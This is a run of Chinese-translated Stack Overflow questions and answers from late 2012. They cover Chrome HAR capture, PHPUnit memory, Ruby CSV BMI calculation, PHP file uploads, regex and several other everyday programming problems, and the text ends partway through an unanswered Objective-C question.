我试图深入研究[Google Chrome Extensions API](http://developer.chrome.com/stable/extensions/api_index.html)，确实我设法自动化了一些任务，但对于 HAR 文件生成方面的问题仍然没有运气。现在[这种方法](http://developer.chrome.com/stable/extensions/devtools.network.html#method-getHAR)特别有前途，但我仍然不知道如何使用它。

换句话说，我需要*谷歌的人*做[这个实验](https://developers.google.com/speed/articles/spdy-for-mobile)。请注意以下事项：

 *> 我们将 Chrome 的[远程调试界面](https://developers.google.com/chrome-developer-tools/docs/remote-debugging)与自定义客户端一起使用，该客户端启动手机上的浏览器，清除其缓存和其他状态，启动网页加载，并接收 Chrome 开发人员工具消息以确定页面加载时间和其他性能指标。

有任何想法吗？

* * *

# 解决方案

出于好奇，我最终得到了一个自动化此类测试的 Node.js 模块：[chrome-har-capturer](https://github.com/cyrus-and/chrome-har-capturer)。这也让我有机会深入研究[远程调试协议](https://developer.chrome.com/devtools/docs/protocol/1.1/index)并为通用 Chrome 自动化编写一个较低级别的 Node.js 接口：[chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface)。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-24T02:56:23.607

简短的回答是，没有办法直接获取您所追求的数据。该`getHAR`方法仅适用于旨在扩展 DevTools 本身的扩展。好消息是，您可以自己构建 HAR 文件而不会遇到太多麻烦——这正是[phantom.js 所做的](https://github.com/ariya/phantomjs/blob/master/examples/netsniff.js)。

1.  使用远程调试启动 Chrome
2.  使用 websocket 连接在调试端口上连接到 Chrome
3.  启用“网络”调试，您还可以清除缓存等 - 请参阅[网络 API](https://developers.google.com/chrome-developer-tools/docs/protocol/1.0/network)。
4.  告诉浏览器导航到您要捕获的页面，Chrome 会将所有请求元数据流式传输给您。
5.  将网络数据按摩成 HAR 格式，ala phantom.js
6.  ...
7.  利润。

首先，我有一篇文章，其中包含示例 Ruby 代码，您应该从步骤 1-4 开始：[http ://www.igvita.com/2012/04/09/driving-google-chrome-via-websocket -api/](http://www.igvita.com/2012/04/09/driving-google-chrome-via-websocket-api/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-10-23T08:49:00.400

现在有一个浏览器插件可以做到这一点：[https ://github.com/devtools-html/har-export-trigger](https://github.com/devtools-html/har-export-trigger)

它使用 WebExtensions DevTools API，我让它与 Firefox 和 Chrome 一起工作。

在此处查看我的 Chrome 代码：[https ://github.com/theri/web-measurement-tools/blob/master/load/load_url_using_chrome.py#L175](https://github.com/theri/web-measurement-tools/blob/master/load/load_url_using_chrome.py#L175)

在 Chrome 中自动安装插件比在 Firefox 中复杂一些，但可行 - 我在本地提取了插件存档，然后在 chrome_prefs.json 中链接到它（参见相同的存储库）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-08-03T19:54:49.213

不确定是否有帮助，[HAR Recorder](https://chrome.google.com/webstore/detail/har-recorder/emfabjnfjiknifjlfpjobbecfepplhkd/)使用 chrome 调试协议来记录 HAR 并生成 har 文件**（无需打开 devtools）**。如果你想要一个变体，你可以分叉并对其进行更改。*

# python - 在 Python 中获取系统默认的 ca 证书文件

> ID：13537534
> 
> 赞同：4
> 
> 时间：2012-11-24T01:38:40.957
> 
> 标签：python, certificate

是否有用于请求操作系统默认 CA 证书文件路径的 Python 方法？在我的 Debian 安装中，它位于 /etc/ssl/certs/ca-certificates.crt，但我不能在其他系统上依赖它。

# hyperlink - 为什么从 HyperlinkBut ton 导航到 Internet 会导致我的应用程序崩溃？

> ID：13537538
> 
> 赞同：1
> 
> 时间：2012-11-24T01:40:16.117
> 
> 标签：hyperlink, windows-8, winrt-xaml, windows-store-apps

我正在尝试使用 HyperlinkBut​​ton 从设置弹出窗口中显示隐私声明；但是，单击超链接后，我遇到了两个对话框的崩溃。楼上的说：

```
~~~~~~~~~~~~~~~~~~~~~~~~
Warning
A debugger is attached to <ProjectName> but not configured to debug this  
unhandled exception. To debug this exception, detach the current debugger.
~~~~~~~~~~~~~~~~~~~~~~~~ 
```

...并在第二个对话框下方显示：

```
~~~~~~~~~~~~~~~~~~~~~~~~
Visual Studio Just-In-Time Debugger
An unhandled win32 exception occurred in <ProjectName> [10704].

Possible Debuggers:
New instance of Microsoft Visual Studio 2012
            Yes No
~~~~~~~~~~~~~~~~~~~~~~~~ 
```

当我选择“否”来启动那个新实例时，我被从模拟器转移回我的调试会话——实际上，调试会话被终止了——就好像我有 Shift+F5'd。

我的 XAML 是：

```
<HyperlinkButton Grid.Row="4" Grid.ColumnSpan="2" Content="Duckbilled Platypi Privacy Statement" NavigateUri="http://montereyscenics.posterous.com"/> 
```

## 更新

因此，由于链接在 AppSettings 示例中运行良好，我向超链接添加了一个 OnTapped 事件（诚然，这与那里显示的 OnClicked 不同），因此它现在看起来像这样：

```
<HyperlinkButton Grid.Row="4" Grid.ColumnSpan="2" Content="Time and Space Lines Privacy Statement" NavigateUri="http://montereyscenics.com/" Tapped="PrivacyHyperlink_OnTapped"/> 
```

...和处理程序：

```
async void PrivacyHyperlink_OnTapped(object sender, TappedRoutedEventArgs e)
{
    await Windows.System.Launcher.LaunchUriAsync(new Uri(((HyperlinkButton)sender).Tag.ToString()));
} 
```

它工作了一秒钟 - 它立即打开了页面。但是随后它在处理程序中的“等待”行（唯一的行）上崩溃了，并带有以下消息：

“*System.NullReferenceException 未被用户代码 HResult=-2147467261 处理，消息=对象引用未设置为对象的实例。来源=MetroSandboxPlaypen StackTrace：在 MetroSandboxPlaypen.TandSLsSettings.d__0.MoveNext() in...*”

# android - 在 ViewPager 中丢失具有多个片段的视图

> ID：13537539
> 
> 赞同：0
> 
> 时间：2012-11-24T01:41:03.743
> 
> 标签：android, android-fragmentactivity

我一直在开发一个应用程序来显示具有类似于下面模型的布局的媒体。每个片段都是一对带有 4 个自定义布局的线性布局元素，用于显示图像视图和文本视图。

如果我有超过 2 个片段并左右滑动以浏览各个片段，则 4 个自定义图像视图不会显示在片段内。我认为这是由于 Android 将所有图像加载到堆上而导致的垃圾收集。

我尝试使用每个片段的 onResume() 方法在它们可见时重建布局，结果是灾难性的。

由于不同的用户可能会根据他们设置媒体的方式有不同的片段计数，因此对于像这样大量图像的活动，什么被认为是最佳实践。还有人对如何判断片段的布局是否需要重建有任何建议。

这是我的第一个 Android 应用程序，学习曲线感觉相当陡峭。

![小样](../Images/a82e0647d0986456435bdc263a933603.png)

编辑：根据要求，这是适配器和片段。

```
public static class HomeScreenPagerAdapter extends FragmentPagerAdapter {

    public HomeScreenPagerAdapter(FragmentManager fm) {
        super(fm);
    }

    @Override
    public Fragment getItem(int i) {            

        MediaPayload mediaWrapper = new MediaPayload();
        mediaWrapper.Item = items[i];

        Fragment fragment = new EhsFragment();
        Bundle bundle = new Bundle();
        bundle.putSerializable("InterActivityPayload", payload);
        bundle.putSerializable("MediaWrapper", mediaWrapper);
        fragment.setArguments(bundle);

        return fragment;
    }

    @Override
    public int getCount() {
        return items.length;
    }

    @Override
    public CharSequence getPageTitle(int position) {
        return items[position].Name;
    }

} 
```

该片段是 500+ 行，所以我[将它放在了 Dropbox 中](https://dl.dropbox.com/u/4038856/ehsFragment.java)。如果人们愿意，我可以将它内联发布，但它有很多代码。

# python - 一长串数字

> ID：13537543
> 
> 赞同：0
> 
> 时间：2012-11-24T01:42:17.230
> 
> 标签：python, list, numbers

我想用python写一长串数字，但我不想一个一个地输入数字，因为那很无聊。那么，我该怎么做呢？对于熟悉 MATLAB 的人，我想写一些看起来 1:100 的东西，但我不知道如何用 python 编写它！顺便说一句，我可以在循环中为单元素列表附加数字，但我正在寻找类似于内置运算符的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:42:58.483

你想要类似内置`range`函数的东西吗？

```
>>> range(1,10)
[1, 2, 3, 4, 5, 6, 7, 8, 9]
>>> range(1,10,2)
[1, 3, 5, 7, 9] 
```

在 python 3.x 中，`range`不再返回一个列表，它返回一个`range object`. Range 对象在很多方面表现得像列表，但它们实际上并不是列表。如果你真的需要一个关于 python 3.x 的列表，你可以使用`list(range(...))`

Numpy 有一个类似的功能`arange`，它也适用于浮点数：

```
>>> np.arange(1,2,.1)
array([ 1\. ,  1.1,  1.2,  1.3,  1.4,  1.5,  1.6,  1.7,  1.8,  1.9]) 
```

# php - 清除 PHP 正在使用的内存

> ID：13537545
> 
> 赞同：12
> 
> 时间：2012-11-24T01:42:30.367
> 
> 标签：php, memory, phpunit

我遇到了一个有趣的问题。我正在使用 PHPUnit，我的测试每次运行时都会占用更多内存。IE...

2.25 MB

2.5 MB

3.0 MB

3.5 MB .......

有谁知道如何清除正在消耗的内存，有人可以建议我深入探索吗？直接的问题是我的一些较大的测试内存不足，仅仅继续增加 PHP 中的最大内存分配还不够好......我需要知道为什么从命令行运行的 PHPUnit 测试会有内存在运行之间“停留”的用法。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-11-25T14:05:04.427

内存增加有三到四个原因：

### 1) PHPUnit 收集代码覆盖率数据

除了关闭代码覆盖率之外，您无能为力。

### 2) PHPUnit 缓存文件令牌以进行代码覆盖

您可以`<phpunit cacheTokens="false">`在您的 PHPUnit xml 中使用。请参阅[http://phpunit.de/manual/current/en/installation.html#installing.upgrading中的说明](http://phpunit.de/manual/current/en/installation.html#installing.upgrading)

### 3) PHPUnit 自身没有正确清理

在其当前的实现中，它保留了测试用例，因为那是存储结果数据的地方。将来这将被更改为更有效，但现在它是如何运作的。

### 4）通向“4”：你也需要清理自己

由于`TestCase`实例保留在周围，因此您的成员变量也保留在周围。

这意味着您可以通过使用来节省大量内存

```
public function tearDown() {
    unset($this->whatever);
} 
```

但这样做*非常*乏味。

我的建议是为所有的 TestCases 建立一个基础测试类并使用它：

```
class MyBaseTest extends \PHPUnit_Framework_TestCase {

    protected function tearDown()
    {
        $refl = new \ReflectionObject($this);
        foreach ($refl->getProperties() as $prop) {
            if (!$prop->isStatic() && 0 !== strpos($prop->getDeclaringClass()->getName(), 'PHPUnit_')) {
                $prop->setAccessible(true);
                $prop->setValue($this, null);
            }
        }
    }
} 
```

这将以一种很好的自动化方式在您之后进行清理。

（片段的道具转到： http: [//kriswallsmith.net/post/18029585104/faster-phpunit](http://kriswallsmith.net/post/18029585104/faster-phpunit)）

* * *

PHPUnit 不能以向后兼容的方式做到这一点，这不会破坏人们的项目，所以你必须自己添加它:)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-24T02:15:29.357

Calvin，根据[聊天](https://chat.stackoverflow.com/transcript/20021)中的讨论，这是由于缺少重置功能。

在测试的时候，我们必须保证测试环境是一致的，这样我们才能得到准确的结果。计算是输入/输出，因此我们应该[在 PHPUnit 中使用 Fixtures](http://www.phpunit.de/manual/current/en/fixtures.html)来重置存储，以防止像这样的“内存泄漏”。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-12-23T17:02:53.677

@edorian 和 @mauris 已经介绍了 PHPUnit 垃圾收集背后的技术细节，但我想添加 PHPUnit（至少在我正在运行的版本 3.7.21 中）让您能够添加评论：

```
/**
 * @backupGlobals disabled
 */
class MyClassTests extends PHPUnit_Framework_TestCase{} 
```

在添加注释之前，每次运行测试套件时，我的内存使用量大致翻了一番，最后一个达到约 1100 MB。现在它们以 15 MB 运行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T00:32:23.467

如果您使用 PDO（或类似的数据库抽象），那么您可以使用“sqlite::memory:”作为 DSN。这具有三个很大的优点：

1.  每次测试后自动清理
2.  没有机会意外接触生产数据库（例如，即使您在生产服务器上运行单元测试）。
3.  全部在内存中，因此测试可能会运行得更快

缺点是您的 SQL 必须在 MySQL 和 SQLite 之间移植。这可能需要做很多工作（对于更大的项目，这通常是值得的，不仅仅是为了测试，而是为了改进代码设计的方式。）在你的情况下，你在聊天记录中提到了使用 Doctrine ，所以你可能已经有了一个很好的抽象，因此它可能只是在 SQLite 上运行而无需更改。

# ruby - 使用 ruby 操作 .csv 文件：将两列相乘

> ID：13537550
> 
> 赞同：1
> 
> 时间：2012-11-24T01:43:14.747
> 
> 标签：ruby, csv

谁能想到一种优雅的方式来将 .csv 文件和多个两列放在一起？

我想根据身高和体重计算一个人的体重指数（ [BMI Wikipedia ）并将其存储在第三列中。](http://en.wikipedia.org/wiki/Body_mass_index)

公式为：

```
weight/height^2 
```

我应该逐行阅读 .csv 还是制作一个数组数组？

数据看起来像这样。

```
ID,Forename,Surname,height,weight,
0,jack,smith,177,80,
1,dan,barker,178,82,
2,ben,allen,176,93,
3,ian,bell,175,76,
4,tim,hope,174,75,
5,john,smith,165,80, 
```

谢谢

更新：

到目前为止，我有两个身高和体重数组

```
require 'csv'
filename = 'bmi_test.csv'

height = []
weight = []

CSV.foreach(filename, :headers => true) do |row|
  height << row[3].to_i
  weight << row[4].to_i
end 
```

...现在我有两个数组，我试图将一个数组的索引 0 与另一个数组的索引 0 相乘。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T02:17:42.553

```
require 'csv'

CSV.open("output.csv", "wb", :headers => true) do |output|
  CSV.foreach("input.csv", :headers => true, :return_headers => true) do |row|
    if row.header_row?
      output << (row << "bmi")
    else
      output << (row << row['weight'].to_f / (row['height'].to_f / 100) ** 2)
    end
  end
end 
```

或者，如果您不想输出 CSV，您只需要数组中的结果：

```
result = []
CSV.foreach("input.csv", :headers => true) do |row|
  result << (row << row['weight'].to_f / (row['height'].to_f / 100) ** 2)
end 
```

您现在应该有一个可以访问的数组`result[0]['bmi']`，等等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T02:11:42.180

拥有两个数组后，这是一种方法：

```
bmi = weight.each_with_index.map { |w, i| w.to_f / height[i]**2 } 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-24T01:56:43.490

这可以通过 来完成`ruby`，但要获得优雅的解决方案，请使用`awk`：

```
awk -F, 'NR==1 { print $0 "bmi"; next } { printf "%s%.2f\n", $0, $5/($4/100)^2 }' file 
```

结果：

```
ID,Forename,Surname,height,weight,bmi
0,jack,smith,177,80,25.54
1,dan,barker,178,82,25.88
2,ben,allen,176,93,30.02
3,ian,bell,175,76,24.82
4,tim,hope,174,75,24.77
5,john,smith,165,80,29.38 
```

# node.js - 使用 Spooky.js 运行示例代码时出错

> ID：13537551
> 
> 赞同：2
> 
> 时间：2012-11-24T01:43:40.253
> 
> 标签：node.js, webkit, phantomjs, casperjs, spookyjs

我对整堆, 和`node.js`都是`phantom.js`新手。我已经安装了所有东西（在 Windows 中），更新了 PATH 并遵循了这个例子：`casper.js``spooky.js`

[https://github.com/WaterfallEngineering/SpookyJS](https://github.com/WaterfallEngineering/SpookyJS)

我收到了这个错误：

```
C:\node_modules\spooky>node examples/hello.js

events.js:68
        throw arguments[1]; // Unhandled 'error' event
                       ^
Error: Child terminated with non-zero exit code 127
    at Spooky._spawnChild.Spooky._instances.(anonymous function) (C:\node_module
s\spooky\lib\spooky.js:82:17)
    at ChildProcess.EventEmitter.emit (events.js:96:17)
    at Process._handle.onexit (child_process.js:678:10) 
```

任何人都知道为什么以及如何解决它？我跑得`casperjs googlelinks.js`很好。但是有了`node.js`and `spooky.js`，它给我带来了麻烦。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-07T21:39:51.427

这是因为 CasperJS Windows 可执行文件被命名`casperjs.bat`为`casperjs`. 请参阅有关@mike 提到的错误的[评论。](https://github.com/WaterfallEngineering/SpookyJS/issues/14#issuecomment-11527568)

不幸的是，你现在必须解决[这个错误](https://github.com/WaterfallEngineering/SpookyJS/issues/21)。我将在本周发布一个修复程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-22T16:23:38.953

这是基于@mike 和@lawnsea 提供的解决方法，这确实使我找到了解决方案，但像我这样的初学者并没有立即清楚。minaki 的提示也帮助我理解了该怎么做：[https ://github.com/WaterfallEngineering/SpookyJS/issues/14](https://github.com/WaterfallEngineering/SpookyJS/issues/14)

**在带有 NPM 的 WINDOWS 7 上安装 SPOOKY.JS**。

我在用着：

*   Win7 64位
*   节点 v0.10.17
*   CasperJS 1.1.0-DEV
*   幻影JS 1.9.2
*   已将所有内容添加到我的 $PATH

脚步：

*   新鲜目录：mkdir spookytest, cd spookytest
*   npm 安装幽灵
*   在文本编辑器中打开 spookytest\node_modules\spooky\lib\spooky.js
*   将第 26 行（defaults.child.command）从“casperjs”更改为“casperjs.bat”
*   将第 30 行（defaults.child.transport）从“stdio”更改为“http”
*   保存并返回到 spookytest 目录
*   节点 node_modules/spooky/examples/hello.js

--> 你好，来自 Spooky the Tuff Little Ghost - 维基百科，免费的百科全书

# php - PHP文件上传脚本未上传

> ID：13537552
> 
> 赞同：0
> 
> 时间：2012-11-24T01:43:48.773
> 
> 标签：php, forms, file, file-upload

有一页上有一个小表格，其中包含以下代码，

```
<div class="postcomment">
<form id="comments" action="insertcomment.php" method="POST" enctype="multipart/form-data">
Comment: <input type="text" name="comment" id="commentfield">
<input type="submit" name="submit" value="Post comment" class="button">
<br>
<input type="hidden" name="MAX_FILE_SIZE" value="1048576" />
Image: <input type="file" name="image" />
<br>
</div> 
```

一旦用户通过浏览表单添加图片，然后转到下面的 insertcomment.php 代码

```
$target_path = "images/";

$file_path = $target_path . basename( $_FILES['uploadedfile']['name']); 

if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $file_path)) {
    echo "The file ".  basename( $_FILES['uploadedfile']['name']). " has been uploaded";
} else{
    echo "There was an error uploading the file, please try again!";
} 
```

并且由于某种原因，它显示错误而不显示在图像目录中，错误是：解析错误：语法错误，第 18 行 /homepages/21/d417005970/htdocs/rk8479/htdocs/insertcomment.php 中的意外 T_IF

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:53:13.633

试试这个 HTML

```
<div class="postcomment">
<form id="comments" action="insertcomment.php" method="POST" enctype="multipart/form-data">
Comment: <input type="text" name="comment" id="commentfield">
<br>
Image: <input type="file" name="image" />
<br>
<input type="submit" name="submit" value="Post comment" class="button">
</form>
</div> 
```

PHP 代码（您尝试在同一页面上使用它，您可以检查 if(isset($_POST['submit']))

```
if($_FILES['image']['size'] > 0){
        $allowedExts = array("jpg", "jpeg", "gif", "png");
        $extension = end(explode(".", $_FILES["image"]["name"]));
        if ((($_FILES["image"]["type"] == "image/gif")
        || ($_FILES["image"]["type"] == "image/jpeg")
        || ($_FILES["new_image"]["type"] == "image/png")
        || ($_FILES["image"]["type"] == "image/pjpeg"))
        && ($_FILES["image"]["size"] < 1048576)
        && in_array($extension, $allowedExts))
          {
          if ($_FILES["image"]["error"] > 0)
            {
            $error_message = $_FILES["image"]["error"];
            }
          else
            {

            if (file_exists("images/" . $_FILES["image"]["name"]))
              {
              $error_message = $_FILES["image"]["name"] . " " . $LANG['image_exist'];
              }
            else
              {
              if(move_uploaded_file($_FILES["image"]["tmp_name"],
              "images/" . $_FILES["image"]["name"])) {  
              // success
              $image_name = $_FILES["image"]["name"];
              } else {
              $error_message = "Upload Failed!";
              }
              }
            }
          }
        else
          {
          $error_message = "Error: May be different ext or size";
          }
    } 
```

# java - 将字符串“abc..z”更改为“bcd..a”的更好方法？

> ID：13537553
> 
> 赞同：0
> 
> 时间：2012-11-24T01:43:59.757
> 
> 标签：java, string, format, token

我创建了这段代码，它查看一个字符串标记并对其进行格式化，以便每个字符都移动一个。字符都是小写的，从 a 到 z。

所以如果我的输入是
**abcz** 输出是
**bcda**

现在我将所有字母添加到一个数组列表中，代码确定每个字符的索引并向其添加一个。如果它找到 z，它会打印 a，这样 arraylist 的索引就不会超出范围。

```
List<String> letters = new ArrayList<String>(); 
        String alp = "abcdefghijklmnopqrstuvwxyz";
        for (int i = 0; i<26; i++)
        {
            letters.add(Character.toString(alp.charAt(i)));
        }

        String token = sc.next();
        for (int i = 0; i<token.length(); i++)
        {
            if (letters.get(letters.indexOf(Character.toString(token.charAt(i)))).equals("z"))
            {
                System.out.print("a");
            }
            else
            {
            System.out.print(letters.get(letters.indexOf(Character.toString(token.charAt(i)))+1));
            }
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:48:53.953

一个带有一点模运算的简单循环就可以了，为什么要打扰这么多对象呢？

```
for(int i = 0; i < token.length(); ++i) {
    System.out.print(('a' + (token.charAt(i) + 1 - 'a')%('z' - 'a' + 1)));
} 
```

我们将偏移量从`'a'`1 增加，然后取余数模 26 得到 0 到 25 范围内的偏移量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T01:58:14.040

[Apache commons-lang 库](http://commons.apache.org/lang/)具有[`StringUtils.replaceChars()`](http://commons.apache.org/lang/apidocs/org/apache/commons/lang3/StringUtils.html#replaceChars%28java.lang.String,%20char,%20char%29)可以为您执行此操作的实用程序方法：

```
StringUtils.replaceChars(input, "abcdefghijklmnopqrstuvwxyz", "bcdefghijklmnopqrstuvwxyza"); 
```

虽然有这么大的参数，但看起来有点丑陋的一面。

尽管如此，它只是一行，恕我直言，最好的代码是别人的代码（意思是，如果有一个库可以做到这一点，请倾向于使用它）。

# asp.net - 0 到 16 位数字的正则表达式仅在 ASP.net 中

> ID：13537556
> 
> 赞同：0
> 
> 时间：2012-11-24T01:45:27.307
> 
> 标签：asp.net, regex, digits

我有一个文本字段，用户选择在其中输入数据，它必须是数字并且必须小于或等于 16 位（不超过）。

我有数字的正则表达式，

```
ValidationExpression="^\d{10}$" 
```

正好是 10 位数字。但是如何为我的场景修改它？

对于这么简单的问题，我感到很尴尬，但我感到困惑。如果这是一个重复的问题或有人问过类似的问题，请告诉我。

**注意：**我需要正则表达式`ASP.net`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:46:32.870

[这是一个很好的教程。](http://www.regular-expressions.info/repeat.html)

```
^\d{0,16}$ 
```

请注意，在 .NET 中，`\d`也可以匹配**任何**表示数字的 Unicode 字符（[请参见此处](http://msdn.microsoft.com/en-us/library/20bw873z.aspx#DigitCharacter)）。如果您真的只想要 ASCII 数字，请使用

```
^[0-9]{0,16}$ 
```

（因为我不确定`RegexOptions`如果在您的情况下可能的话，您将如何设置。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T01:47:34.300

花括号量词是`{`*min* `,`*max*`}`，因此`{0,16}`适用于您的情况。

# c# - 适用于 Android 的自定义吐司

> ID：13537557
> 
> 赞同：1
> 
> 时间：2012-11-24T01:45:44.227
> 
> 标签：c#, compiler-errors, position, monodevelop, toast

我正在为 Android 使用 MonoDevelop，希望在创建自定义 toast 方面得到一些帮助。

这是我的代码：

```
 static public void DisplayCustomToast (Context displayContext, string stringText, int offsetX, int offsetY)
    {
        Toast toast = new Toast(displayContext);
        toast.SetText(stringText);
        toast.SetGravity (GravityFlags.Top, offsetX, offsetY);
        //toast.Show;
    } 
```

此代码不起作用。它构建成功，但应用程序无法正常启动。

如果我取消注释“toast.show”，则会出现以下错误：

> 只有赋值、调用、递增、递减、等待和新对象表达式可以用作语句。

我可以在让这段代码正常工作方面得到一些帮助吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:52:31.780

语法`toast.Show`暗示`Show`要么是属性要么是字段。这就是为什么呼叫`toast.Show`是非法的。

不过，我相信`Show`是一种方法。所以你必须这样调用它：

`toast.Show();`

# google-app-engine - 在本地工作，但在部署到 GAE 时抛出 java.lang.IncompatibleClassChangeError

> ID：13537563
> 
> 赞同：1
> 
> 时间：2012-11-24T01:47:04.780
> 
> 标签：google-app-engine, jersey

我正在尝试将 Jersey 与 GAE 结合使用来生成 RestFul 端点。我试图遵循的指南可以在[这里](http://blog.iparissa.com/googles-app-engine-java/google-app-engine-jax-rs-jersey/)找到。该服务在本地运行时正常工作。部署到 GAE 时，我收到 500 错误，堆栈跟踪如下所示。

我正在使用 Eclipse Juno Service Release 1、AppEngine - 1.7.3、jersey-archive-1.1.5-ea-SNAPSHOT

这是我的 Web.xml

```
<?xml version="1.0" encoding="utf-8" standalone="no"?><web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="2.5" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">
    <servlet>
        <servlet-name>Jersey Web Application</servlet-name>
        <servlet-class>com.sun.jersey.spi.container.servlet.ServletContainer</servlet-class>
        <init-param>
            <param-name>com.sun.jersey.config.property.packages</param-name>
            <param-value>com.senseme.server</param-value>
        </init-param>
         <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>Jersey Web Application</servlet-name>
        <url-pattern>/resources/*</url-pattern>
    </servlet-mapping>
    <session-config>
        <session-timeout>
            30
        </session-timeout>
    </session-config>
  <servlet>
    <servlet-name>SystemServiceServlet</servlet-name>
    <servlet-class>com.google.api.server.spi.SystemServiceServlet</servlet-class>
    <init-param>
      <param-name>services</param-name>
      <param-value/>
    </init-param>
  </servlet>

  <servlet-mapping>
    <servlet-name>SystemServiceServlet</servlet-name>
    <url-pattern>/_ah/spi/*</url-pattern>
  </servlet-mapping>

</web-app> 
```

这是我的 appengine-web.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<appengine-web-app xmlns="http://appengine.google.com/ns/1.0">
  <application>sensemeweb</application>
  <version>1</version>

  <!--
    Allows App Engine to send multiple requests to one instance in parallel:
  -->
  <threadsafe>true</threadsafe>

  <!-- Configure serving/caching of GWT files -->
  <static-files>
    <include path="**" />

    <!-- The following line requires App Engine 1.3.2 SDK -->
    <include path="**.nocache.*" expiration="0s" />

    <include path="**.cache.*" expiration="365d" />
    <exclude path="**.gwt.rpc" />
  </static-files>

  <!-- Configure java.util.logging -->
  <system-properties>
    <property name="java.util.logging.config.file" value="WEB-INF/logging.properties"/>
  </system-properties>

  <!--
    HTTP Sessions are disabled by default. To enable HTTP sessions specify:

      <sessions-enabled>true</sessions-enabled>

    It's possible to reduce request latency by configuring your application to
    asynchronously write HTTP session data to the datastore:

      <async-session-persistence enabled="true" />

    With this feature enabled, there is a very small chance your app will see
    stale session data. For details, see
    http://code.google.com/appengine/docs/java/config/appconfig.html#Enabling_Sessions
  -->

</appengine-web-app> 
```

在本地工作，但在部署到 GAE 时会引发以下异常：

```
Uncaught exception from servlet
java.lang.IncompatibleClassChangeError: Implementing class
    at com.google.appengine.runtime.Request.process-eef9dd80521e7794(Request.java)
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:634)
    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
    at java.net.URLClassLoader.defineClass(URLClassLoader.java:277)
    at sun.reflect.GeneratedMethodAccessor5.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:266)
    at com.sun.jersey.api.core.ScanningResourceConfig.init(ScanningResourceConfig.java:68)
    at com.sun.jersey.api.core.PackagesResourceConfig.init(PackagesResourceConfig.java:110)
    at com.sun.jersey.api.core.PackagesResourceConfig.<init>(PackagesResourceConfig.java:76)
    at com.sun.jersey.api.core.PackagesResourceConfig.<init>(PackagesResourceConfig.java:87)
    at com.sun.jersey.spi.container.servlet.WebComponent.createResourceConfig(WebComponent.java:641)
    at com.sun.jersey.spi.container.servlet.WebComponent.createResourceConfig(WebComponent.java:619)
    at com.sun.jersey.spi.container.servlet.WebComponent.init(WebComponent.java:199)
    at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:307)
    at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:470)
    at javax.servlet.GenericServlet.init(GenericServlet.java:212)
    at org.mortbay.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:440)
    at org.mortbay.jetty.servlet.ServletHolder.doStart(ServletHolder.java:263)
    at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
    at org.mortbay.jetty.servlet.ServletHandler.initialize(ServletHandler.java:685)
    at org.mortbay.jetty.servlet.Context.startContext(Context.java:140)
    at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1250)
    at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:517)
    at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:467)
    at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
    at com.google.tracing.TraceContext$TraceContextRunnable.runInContext(TraceContext.java:454)
    at com.google.tracing.TraceContext$TraceContextRunnable$1.run(TraceContext.java:461)
    at com.google.tracing.TraceContext.runInContext(TraceContext.java:703)
    at com.google.tracing.TraceContext$AbstractTraceContextCallback.runInInheritedContextNoUnref(TraceContext.java:338)
    at com.google.tracing.TraceContext$AbstractTraceContextCallback.runInInheritedContext(TraceContext.java:330)
    at com.google.tracing.TraceContext$TraceContextRunnable.run(TraceContext.java:458)
    at java.lang.Thread.run(Thread.java:679) 
```

我几乎尝试了一切都无济于事，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T23:03:50.963

在尝试了我遇到的每个解决方案之后，我发现这是解决问题的解决方案：

[https://stackoverflow.com/a/13552626/778331](https://stackoverflow.com/a/13552626/778331)

# objective-c - 序列化 CGContext

> ID：13537568
> 
> 赞同：1
> 
> 时间：2012-11-24T01:48:34.497
> 
> 标签：objective-c, core-graphics

如何序列化包含修改后的 CGMutablePathRef 的 CGContext？

我目前将上下文保存为 png 表示并将其序列化，但这会导致视网膜显示出现问题。

我想避免序列化视网膜版本并在运行时调整它的大小，因为这样效率低下。

* * *

## 回答 #1

> 赞同：5
> 
